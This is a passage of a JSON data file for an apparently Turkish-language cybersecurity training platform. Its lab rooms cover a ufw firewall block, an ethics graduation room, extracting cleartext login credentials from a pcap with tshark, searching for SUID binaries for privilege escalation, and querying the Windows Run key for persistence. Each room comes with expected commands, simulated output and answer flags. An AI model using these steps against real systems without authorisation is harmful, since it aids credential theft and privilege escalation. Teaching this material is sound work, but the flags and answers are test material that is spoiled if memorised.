        "terminalSuccessOutput": "Rule added\nRule added (v6)\n[GÜVENLİK DUVARI GÜNCELLENDİ]\nStatus: active\nTo                         Action      From\n--                         ------      ----\nAnywhere                   DENY        198.51.100.55\n22/tcp                     ALLOW       Anywhere\n80/tcp                     ALLOW       Anywhere\n443/tcp                    ALLOW       Anywhere\n\n[KALKAN AKTİF] 198.51.100.55 IP adresinden gelen tüm paketler kapıda imha edildi!\n[FLAG] LFL{starter_ufw_firewall_rule_defensive_shield}",
        "flag": "LFL{starter_ufw_firewall_rule_defensive_shield}",
        "nextId": "starter-18",
        "whyWeUse": "Bir önceki odalarda loglarda `198.51.100.55` gibi bir saldırgan IP adresinin sunucumuza saldırdığını tespit ettiğimizde ne yaparız? Sadece izlemeyiz, **Güvenlik Duvarında (Firewall)** o IP adresini anında engelleriz! `ufw deny from <IP>` komutu kapıdaki nöbetçiye 'Bu IP adresinden gelen hiçbir paketi içeri alma, kapıda imha et!' emrini verir.",
        "cmdAnatomy": [
            {
                "token": "ufw",
                "role": "Ana Komut (Uncomplicated Firewall)",
                "desc": "Linux'un kullanımı kolay güvenlik duvarı yönetim aracıdır."
            },
            {
                "token": "deny",
                "role": "Eylem (Engelle / Yasakla)",
                "desc": "Eşleşen trafiğin sunucuya girişini yasaklar."
            },
            {
                "token": "from",
                "role": "Parametre (Kaynaktan)",
                "desc": "Engellenecek trafiğin hangi kaynak adresten geldiğini belirtir."
            },
            {
                "token": "198.51.100.55",
                "role": "Saldırgan IP Adresi",
                "desc": "Sunucumuza erişimini tamamen kestiğimiz saldırganın IP adresidir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Anywhere DENY 198.51.100.55",
                "meaning": "Güvenlik duvarı tablosuna yeni kural eklendi: `198.51.100.55` adresinden sunucunun neresine (`Anywhere`) gelirse gelsin tüm paketler **REDDEDİLECEK (`DENY`)**."
            },
            {
                "snippet": "22/tcp, 80/tcp, 443/tcp ALLOW Anywhere",
                "meaning": "Saldırgan engellenirken normal ziyaretçiler için 22, 80 ve 443 portları açık (`ALLOW`) kalmaya devam ediyor."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Firewall (Güvenlik Duvarı)",
                "desc": "Bilgisayara gelen ve giden ağ paketlerini kurallara göre kontrol edip izin veren (ALLOW) veya engelleyen (DENY/DROP) sistemdir."
            },
            {
                "term": "ALLOW vs DENY",
                "desc": "ALLOW trafiğin geçişine izin verir; DENY ise trafiği kapıda reddeder."
            }
        ],
        "quickCheck": {
            "question": "`ufw deny from 198.51.100.55` komutu çalıştırıldığında ne olur?",
            "options": [
                "`198.51.100.55` IP adresinden sunucumuza gelen tüm ağ paketleri güvenlik duvarı tarafından engellenir",
                "Tüm internet bağlantımız kesilir",
                "Saldırgana yönetici yetkisi verilir"
            ],
            "answer": 0,
            "explanation": "Mükemmel! Sadece saldırganın IP adresini (`198.51.100.55`) kara listeye alarak normal kullanıcıları etkilemeden saldırıyı durdurduk."
        }
    },
    {
        "id": "starter-18",
        "track": "starter",
        "title": "Starter Mezuniyeti: Etik Hackleme, Sorumlu İfşa & CTF Ruhu",
        "level": "0. Temel Altyapı",
        "badge": "ACADEMY GRADUATION & ETHICAL HACKING",
        "theory": "### Büyük Güç Büyük Sorumluluk Getirir: Etik Siber Güvenlik\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir çilingirin elinde istediği her kapıyı açabilecek maymuncuk seti vardır. Ancak çilingir bu aletleri hırsızlık yapmak için değil; kapıda kalan insanlara yardım etmek ve kilitlerin sağlamlığını denetlemek için kullanır. Etik hacker (Beyaz Şapka) tam olarak bu saygın çilingirdir.\n\n#### Altın Kurallar:\n* **İzin Olmadan Test Yapılmaz:** İzniniz olmayan bir sisteme `nmap` atmak bile kanunen suç teşkil edebilir. Daima kendi laboratuvarınızda veya yazılı izinli hedeflerde çalışın.\n* **Sorumlu İfşa (Responsible Disclosure):** Bulduğunuz bir açığı internete sızdırmak yerine doğrudan sistem sahibine raporlayıp düzeltmesi için süre tanıyın.\n* **18 Starter Odasını Tamamladınız!** Artık ağları, portları, DNS'i, Linux çekirdeğini, süreçleri, logları, trafiği ve şifrelemeyi anlayan sağlam bir temele sahipsiniz!",
        "mission": "Starter eğitim patikasını başarıyla tamamladığınızı belgeleyen mezuniyet sertifika bayrağını okumak için cat /home/student/starter_graduation.txt komutunu çalıştırın.",
        "expectedCommand": "cat /home/student/starter_graduation.txt",
        "acceptedCommands": [
            "cat /home/student/starter_graduation.txt",
            "cat starter_graduation.txt",
            "more /home/student/starter_graduation.txt"
        ],
        "hintExplanation": "<p><strong>cat:</strong> Dosya içeriğini ekrana yazdırır.</p><p><strong>starter_graduation.txt:</strong> 18 odalık temel eğitimi bitirdiğinizde size tahsis edilen nihai mezuniyet sertifikasıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🎓 TEBRİKLER! LFL SİBER AKADEMİ STARTER PATİKASINI TAMAMLADINIZ! 🎓\n========================================================================\n[TEMEL YETKİNLİKLER KAZANILDI]:\n✔ Ağ Mimarisi: IP, MAC, Portlar, DNS ve TCP El Sıkışması\n✔ Linux Sistem Yönetimi: Dosya Hiyerarşisi, CLI, İzinler (chmod) & Süreçler (ps)\n✔ Ağ & Trafik Analizi: ss, netstat, Wireshark, tcpdump & HTTP Headers\n✔ Kriptografi & Savunma: Hashleme, SSH Anahtarları ve UFW Güvenlik Duvarı\n\nŞimdi önünüzde 3 büyük uzmanlık yolu açıldı:\n🔴 RED TEAM (12 Görev Odası - Ofansif Saldırı & Pentest)\n🔵 BLUE TEAM (9 Görev Odası - SOC & Tehdit Avcılığı)\n🟣 PURPLE TEAM (6 Görev Odası - Hibrit Tatbikat & Güvenlik Doğrulama)\n\n[MEZUNİYET BAYRAĞI]: LFL{starter_18_rooms_fully_completed_ready_for_specialization}\n========================================================================",
        "flag": "LFL{starter_18_rooms_fully_completed_ready_for_specialization}",
        "nextId": "red-101",
        "whyWeUse": "17 oda boyunca ağ temellerini, portları, DNS'i, Linux dosya yapısını, boru hattını (`|`), izinleri (`chmod`), Nmap taramasını, kriptografiyi, süreçleri (`ps`), log analizini (`grep`), paket yakalamayı (`tcpdump`), çerezleri, SSH anahtarlarını ve güvenlik duvarını (`ufw`) mantığıyla öğrendin! Şimdi `cat` komutuyla mezuniyet belgeni okuyup uzmanlık patikalarına (Red / Blue / Purple Team) adım atma zamanı.",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "Ana Komut (Concatenate / Dosya Oku)",
                "desc": "Belirtilen metin dosyasının içeriğini terminal ekranına yazdırır."
            },
            {
                "token": "/home/student/starter_graduation.txt",
                "role": "Mezuniyet Dosyası Yolu",
                "desc": "`/home/student` klasöründe yer alan Starter Patikası mezuniyet sertifikası dosyasıdır."
            }
        ],
        "outputGuide": [
            {
                "snippet": "TEBRİKLER! LFL SİBER AKADEMİ STARTER PATİKASINI TAMAMLADINIZ!",
                "meaning": "18 odalık temel siber güvenlik altyapı eğitimini başarıyla tamamladığını doğrulayan mezuniyet mesajıdır."
            },
            {
                "snippet": "RED TEAM / BLUE TEAM / PURPLE TEAM",
                "meaning": "Artık temel kavramları bildiğin için saldırı (Red), savunma (Blue) veya hibrit (Purple) odalardaki ileri seviye araçları ezberlemeden mantığıyla kullanabilirsin!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "White Hat (Beyaz Şapkalı Hacker)",
                "desc": "Siber güvenlik bilgisini sistemleri korumak ve güvenlik açıklarını yasal izinle tespit edip kapatmak için kullanan etik uzmandır."
            },
            {
                "term": "Responsible Disclosure (Sorumlu İfşa)",
                "desc": "Bulunan bir güvenlik açığını kötüye kullanmadan, düzeltilmesi için doğrudan ilgili kuruma bildirme ilkesidir."
            }
        ],
        "quickCheck": {
            "question": "Etik siber güvenliğin (Beyaz Şapkalı Hackerlığın) bir numaralı altın kuralı nedir?",
            "options": [
                "Yalnızca yasal iznimiz olan sistemlerde ve laboratuvar ortamlarında test yapmak, bulduğumuz açıkları kurumlara sorumlu şekilde raporlamak",
                "İzinsiz her sistemi taramak",
                "Bulunan açıkları internette paylaşmak"
            ],
            "answer": 0,
            "explanation": "Tebrikler!Starter Patikasını tam anlamıyla kavrayarak bitirdin. Artık gerçek bir siber güvenlik adayı olarak uzmanlık odalarına geçmeye hazırsın!"
        }
    },
    {
        "id": "red-101",
        "track": "red",
        "title": "Ağ Temelleri: TCP/IP & Paket Analizi",
        "level": "1. Temel Altyapı",
        "badge": "NETWORKING & RFC PROTOCOLS",
        "theory": "### Ağ Temelleri: Sistemlerin Çalışma Mantığı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİki kişinin telefonla konuşmadan önce birbirine \"Alo!\", \"Sesim geliyor mu?\", \"Evet, seni duyuyorum\" demesidir (TCP 3 Yollu El Sıkışma). Karşı taraf duymadan veri aktarımı başlamaz!\n\nSistemlerin çalışma mantığını anlamadan onları manipüle edemezsiniz. İlk adım bu temelleri atmaktır.\n\n#### 1. OSI ve TCP/IP Modelleri:\nAğ trafiği 7 katmanlı OSI (veya 4 katmanlı TCP/IP) mimarisinde paketlenir. Bir saldırgan olarak bilmeniz gereken en kritik nokta **TCP 3-Way Handshake** sürecidir:\n* **SYN:** İstemci, sunucuya rastgele bir sıra numarasıyla (ISN) bağlantı talebi gönderir.\n* **SYN-ACK:** Sunucu portu dinliyorsa talebi kabul eder ve kendi sıra numarasıyla yanıt verir.\n* **ACK:** İstemci onay paketi gönderir; oturum kurulur (ESTABLISHED).\n\n#### 2. Kritik Protokoller ve Varsayılan Portlar:\n* **DNS (Port 53 UDP/TCP):** İsim çözümleme. Zone Transfer (`axfr`) açıkları ve DNS Tünelleme alanı.\n* **HTTP/HTTPS (Port 80/443 TCP):** Web haberleşmesi. İstismar zincirlerinin çoğunun başladığı yüzey.\n* **SSH (Port 22 TCP):** Şifreli uzak yönetim. Brute-force ve anahtar sızıntısı hedefleri.\n* **SMB (Port 445 TCP):** Windows dosya paylaşımı. EternalBlue (MS17-010), NTLM Relay saldırılarının merkezi.\n* **DHCP (Port 67/68 UDP):** Dinamik IP yapılandırması. Rogue DHCP sunucusu ve MitM saldırı alanı.\n\n#### 3. Wireshark ile Trafik Analizi:\nAğ kartının 'promiscuous mode' moduna alınarak kablodan geçen her baytın incelenmesi. Şifrelenmemiş protokollerde (HTTP, FTP, Telnet) şifreler açık metin (cleartext) olarak yakalanır.",
        "mission": "Wireshark/tshark simülasyonunda yakalanan 'traffic.pcap' paket dökümünden HTTP isteklerini filtreleyerek web formundan gönderilen yönetici şifresini ortaya çıkarın.",
        "expectedCommand": "tshark -r traffic.pcap -Y \"http.request\"",
        "acceptedCommands": [
            "tshark -r traffic.pcap -Y http.request",
            "tshark -r traffic.pcap -Y http",
            "tshark -r traffic.pcap -Y \"http.request.method == POST\"",
            "tshark -r traffic.pcap -Y 'http.request.method == \"POST\"'",
            "tcpdump -r traffic.pcap -A",
            "strings traffic.pcap | grep -i password"
        ],
        "hintExplanation": "<p><strong>tshark:</strong> Wireshark programının komut satırı halidir, ağ paketlerini incelememizi sağlar.</p>\n<p><strong>-r traffic.pcap:</strong> \"Read\" parametresidir. Daha önce kaydedilmiş <code>traffic.pcap</code> paket dosyasını okur.</p>\n<p><strong>-Y \"http.request\":</strong> Ekrana binlerce ilgisiz paket yerine yalnızca web tarayıcısının form doldurup sunucuya gönderdiği HTTP isteklerini filtreler. Böylece şifrelenmemiş oturum açma isteğindeki parola açık metin (cleartext) olarak okunur.</p>",
        "terminalSuccessOutput": "[+] TSHARK PAKET AYRIŞTIRICI DEVREDE...\nPaket No: 142 | TCP Kaynak: 192.168.1.45:49152 -> Hedef: 192.168.1.10:80\nPOST /login.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nForm Verisi: username=admin&password=LFL{pcap_cleartext_creds_leaked}\n[FLAG DOĞRULANDI] Açık metin kimlik bilgisi başarıyla ele geçirildi!",
        "flag": "LFL{pcap_cleartext_creds_leaked}",
        "nextId": "red-102",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `tshark -r traffic.pcap -Y \"http.request\"` komutunu kullanmamızın sebebi; **Ağ Temelleri: TCP/IP & Paket Analizi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. tshark: Wireshark programının komut satırı halidir, ağ paketlerini incelememizi sağlar. -r traffic.pcap: \"Read\" parametresidir. Daha önce kaydedilmiş traffic.pcap paket dosyasını okur. -Y \"http.request\": Ekrana binlerce ilgisiz paket yerine yalnızca web tarayıcısının form doldurup sunucuya gönderdiği HTTP isteklerini filtreler. Böylece şifrelenmemiş oturum açma isteğindeki parola açık metin (cleartext) olarak okunur.",
        "cmdAnatomy": [
            {
                "token": "tshark",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (tshark)."
            },
            {
                "token": "-r",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-r)."
            },
            {
                "token": "traffic.pcap",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (traffic.pcap)."
            },
            {
                "token": "-Y",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-Y)."
            },
            {
                "token": "\"http.request\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"http.request\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] TSHARK PAKET AYRIŞTIRICI DEVREDE...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Paket No: 142 | TCP Kaynak: 192.168.1.45:49152 -> Hedef: 192.168.1.10:80",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "POST /login.php HTTP/1.1",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "User-Agent: Mozilla/5.0",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "axfr",
                "desc": "Bu odadaki (Ağ Temelleri: TCP/IP & Paket Analizi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `tshark -r traffic.pcap -Y \"http.request\"` komutunun temel amacı nedir?",
            "options": [
                "Wireshark/tshark simülasyonunda yakalanan 'traffic.pcap' paket dökümünden HTTP isteklerini filtreleyerek web formundan gönderilen yönetici şifresini ortaya çıkarın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `tshark -r traffic.pcap -Y \"http.request\"` komutu ezbere yazılan bir kod değil; tshark: Wireshark programının komut satırı halidir, ağ paketlerini incelememizi sağlar. -r traffic.pcap: \"Read\" parametresidir. Daha önce kaydedilmiş traffic.pcap paket dosyasını okur. -Y \"http.request\": Ekrana binlerce ilgisiz paket yerine yalnızca web tarayıcısının form doldurup sunucuya gönderdiği HTTP isteklerini filtreler. Böylece şifrelenmemiş oturum açma isteğindeki parola açık metin (cleartext) olarak okunur."
        }
    },
    {
        "id": "red-102",
        "track": "red",
        "title": "İşletim Sistemleri: Linux Mimarisi & SUID İzinleri",
        "level": "1. Temel Altyapı",
        "badge": "LINUX INTERNALS & BASH",
        "theory": "### Linux Temelleri: Dosya Hiyerarşisi ve İzinler\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSıradan bir memurun, üzerinde \"Genel Müdür Mührü\" olan özel bir evrakı eline aldığında bir dakikalığına genel müdür yetkisiyle emir verebilmesi gibidir (SUID Biti). Eğer bu evrak kötüye kullanılırsa tüm şirket ele geçirilir!\n\nLinux dünyasında her şey bir dosyadır. Cihazlar, prosesler ve soketler dosya sisteminde haritalanır.\n\n#### 1. Linux Dosya İzinleri ve Özel Bayraklar:\nKlasik Linux izinleri Sahip (u), Grup (g) ve Diğerleri (o) için Okuma (r=4), Yazma (w=2) ve Çalıştırma (x=1) şeklindedir.\n* **SUID (Set User ID) Biti:** Bir çalıştırılabilir dosyaya `chmod u+s` verildiğinde, o dosya kimin tarafından çalıştırılırsa çalıştırılsın **dosya sahibinin yetkileriyle** ayağa kalkar.\n* Eğer dosya sahibi `root` ise ve bu program içinde bir komut satırı açabiliyorsanız (Örn: `find`, `vim`, `bash`, `nmap`), anında en yetkili kullanıcı olursunuz.\n\n#### 2. Kritik Dizinler:\n* `/etc/passwd`: Kullanıcı listesi (okunabilir).\n* `/etc/shadow`: Kullanıcı parola hashleri (yalnızca root okuyabilir).\n* `/proc`: Canlı çekirdek ve proses belleği (`/proc/$PID/cmdline`).",
        "mission": "Dosya sistemi kök dizininde (`/`) SUID biti atanmış ikili dosyaları arayın, yetkimiz olmayan dizin hatalarını 2>/dev/null ile gizleyin.",
        "expectedCommand": "find / -perm -u=s -type f 2>/dev/null",
        "acceptedCommands": [
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -u=s 2>/dev/null",
            "find / -perm /4000 -type f 2>/dev/null"
        ],
        "hintExplanation": "<p><strong>find /:</strong> Tüm bilgisayarın ana kök klasöründen (/) aramaya başla demektir.</p>\n<p><strong>-perm -u=s:</strong> \"Permission User SetUID\" iznine sahip programları arar. Bu dosyalar sıradan bir kullanıcı çalıştırsa bile dosyanın asıl sahibi (genellikle root) kimse onun tam yetkisiyle ayağa kalkar!</p>\n<p><strong>-type f:</strong> Klasörleri değil sadece normal dosyaları (file) listeler.</p>\n<p><strong>2>/dev/null:</strong> Okuma yetkimizin olmadığı dizinlerde ekrana dolacak 'Erişim Engellendi' hata yazılarını çöp kutusuna atıp ekranı temiz tutar.</p>",
        "terminalSuccessOutput": "[+] SUID BİTİNE SAHİP DOSYALAR LİSTELENİYOR:\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/local/bin/backup_utility [ZAFİYETLİ SUID: Root izinleriyle çalışıyor!]\n[FLAG] LFL{linux_suid_priv_checker_ok}",
        "flag": "LFL{linux_suid_priv_checker_ok}",
        "nextId": "red-103",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `find / -perm -u=s -type f 2>/dev/null` komutunu kullanmamızın sebebi; **İşletim Sistemleri: Linux Mimarisi & SUID İzinleri** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. find /: Tüm bilgisayarın ana kök klasöründen (/) aramaya başla demektir. -perm -u=s: \"Permission User SetUID\" iznine sahip programları arar. Bu dosyalar sıradan bir kullanıcı çalıştırsa bile dosyanın asıl sahibi (genellikle root) kimse onun tam yetkisiyle ayağa kalkar! -type f: Klasörleri değil sadece normal dosyaları (file) listeler. 2>/dev/null: Okuma yetkimizin olmadığı dizinlerde ekrana dolacak 'Erişim Engellendi' hata yazılarını çöp kutusuna atıp ekranı temiz tutar.",
        "cmdAnatomy": [
            {
                "token": "find",
                "role": "Ana Komut (Dosya Arama Motoru)",
                "desc": "Sistemdeki klasörler içinde isme, boyuta veya özel izinlere (SUID gibi) göre dosya arar."
            },
            {
                "token": "/",
                "role": "Hedef Dizin (Root / Kök Dizin)",
                "desc": "Linux dosya ağacının en tepesindeki ana başlangıç klasörüdür (Windows'taki C:\\ gibi)."
            },
            {
                "token": "-perm",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-perm)."
            },
            {
                "token": "-u=s",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-u=s)."
            },
            {
                "token": "-type",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-type)."
            },
            {
                "token": "f",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (f)."
            },
            {
                "token": "2>/dev/null",
                "role": "Hata Gizleme Yönlendirmesi",
                "desc": "Komut çalışırken çıkan 'İzin reddedildi (Permission denied)' gibi gereksiz hata mesajlarını çöpe (/dev/null) atar, ekranı temiz tutar."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] SUID BİTİNE SAHİP DOSYALAR LİSTELENİYOR:",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "/usr/bin/passwd",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "/usr/bin/sudo",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "/usr/bin/chsh",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "chmod u+s",
                "desc": "Bu odadaki (İşletim Sistemleri: Linux Mimarisi & SUID İzinleri) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "root",
                "desc": "Bu odadaki (İşletim Sistemleri: Linux Mimarisi & SUID İzinleri) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "find",
                "desc": "Sistemdeki klasörler içinde isme, boyuta veya özel izinlere (SUID gibi) göre dosya arar."
            },
            {
                "term": "vim",
                "desc": "Bu odadaki (İşletim Sistemleri: Linux Mimarisi & SUID İzinleri) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `find / -perm -u=s -type f 2>/dev/null` komutunun temel amacı nedir?",
            "options": [
                "Dosya sistemi kök dizininde (`/`) SUID biti atanmış ikili dosyaları arayın, yetkimiz olmayan dizin hatalarını 2>/dev/null ile gizleyin.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `find / -perm -u=s -type f 2>/dev/null` komutu ezbere yazılan bir kod değil; find /: Tüm bilgisayarın ana kök klasöründen (/) aramaya başla demektir. -perm -u=s: \"Permission User SetUID\" iznine sahip programları arar. Bu dosyalar sıradan bir kullanıcı çalıştırsa bile dosyanın asıl sahibi (genellikle root) kimse onun tam yetkisiyle ayağa kalkar! -type f: Klasörleri değil sadece normal dosyaları (file) listeler. 2>/dev/null: Okuma yetkimizin olmadığı dizinlerde ekrana dolacak 'Erişim Engellendi' hata yazılarını çöp kutusuna atıp ekranı temiz tutar."
        }
    },
    {
        "id": "red-103",
        "track": "red",
        "title": "İşletim Sistemleri: Windows Registry & Kalıcılık",
        "level": "1. Temel Altyapı",
        "badge": "WINDOWS INTERNALS & REGISTRY",
        "theory": "### Windows Mimarisi & Kayıt Defteri (Registry)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBinaya gizlice giren bir hırsızın, her sabah temizlikçinin paspasın altına koyduğu anahtarın yanına kendi gizli yedek anahtarını da iliştirmesidir (Kayıt Defteri Run Kalıcılığı). Sistem her başladığında hırsız içeri otomatik davet edilir!\n\nWindows ortamında sistemin ve yüklü yazılımların tüm davranışları hiyerarşik bir veritabanı olan **Registry (Kayıt Defteri)** içinde saklanır.\n\n#### 1. Kayıt Defteri Ağaçları (Hives):\n* **HKLM (HKEY_LOCAL_MACHINE):** Tüm bilgisayarı ilgilendiren donanım, sürücü ve güvenlik ayarları.\n* **HKCU (HKEY_CURRENT_USER):** O an oturum açmış kullanıcının ayarları.\n* **Kalıcılık (Persistence) Anahtarları:**\n  `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` anahtarına eklenen herhangi bir çalıştırılabilir dosya yolu, bilgisayar her açıldığında otomatik olarak çalışır.\n\n#### 2. Active Directory (AD) Giriş Seviyesi:\nŞirketlerin kullanıcıları, bilgisayarları ve izinleri tek bir merkezden yönettiği veritabanı altyapısıdır (Domain Controller).\n* **LDAP:** Dizin sorgulama protokolü.\n* **Kerberos:** Şifreleri ağdan geçirmeden bilet (Ticket) mekanizmasıyla yetki doğrulayan protokol.",
        "mission": "Sistem başlangıcında otomatik çalışan programları denetlemek için Run kayıt defteri anahtarını sorgulayın.",
        "expectedCommand": "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
        "acceptedCommands": [
            "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "reg query HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
            "powershell Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        ],
        "hintExplanation": "<p><strong>reg query:</strong> Windows Kayıt Defteri (Registry) içindeki ayarları sorgulamak için kullanılan standart komuttur.</p>\n<p><strong>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:</strong> Bilgisayar her açıldığında otomatik başlatılan programların kayıt yoludur. Saldırgan buraya zararlısını eklediğinde, sistem yeniden başlasa dahi kalıcı olur (Persistence).</p>",
        "terminalSuccessOutput": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n    SecurityHealth    REG_SZ    %windir%\\system32\\SecurityHealthSystray.exe\n    UpdaterService    REG_SZ    C:\\Users\\Public\\malicious_beacon.exe\n[FLAG] LFL{windows_registry_persistence_found}",
        "flag": "LFL{windows_registry_persistence_found}",
        "nextId": "red-104",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (1. Temel Altyapı) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"` komutunu kullanmamızın sebebi; **İşletim Sistemleri: Windows Registry & Kalıcılık** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. reg query: Windows Kayıt Defteri (Registry) içindeki ayarları sorgulamak için kullanılan standart komuttur. HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run: Bilgisayar her açıldığında otomatik başlatılan programların kayıt yoludur. Saldırgan buraya zararlısını eklediğinde, sistem yeniden başlasa dahi kalıcı olur (Persistence).",
        "cmdAnatomy": [
            {
                "token": "reg",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (reg)."
            },
            {
                "token": "query",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (query)."
            },
            {
                "token": "\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\")."
            }
        ],
        "outputGuide": [
            {
                "snippet": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "SecurityHealth    REG_SZ    %windir%\\system32\\SecurityHealthSystray.exe",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "UpdaterService    REG_SZ    C:\\Users\\Public\\malicious_beacon.exe",
                "meaning": "Güvenlik analiz aracının şüpheli saldırı izini veya zararlı aktiviteyi **tespit ettiğini** gösteren uyarı satırıdır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "reg",
                "desc": "İşletim Sistemleri: Windows Registry & Kalıcılık görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"` komutunun temel amacı nedir?",
            "options": [
                "Sistem başlangıcında otomatik çalışan programları denetlemek için Run kayıt defteri anahtarını sorgulayın.",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
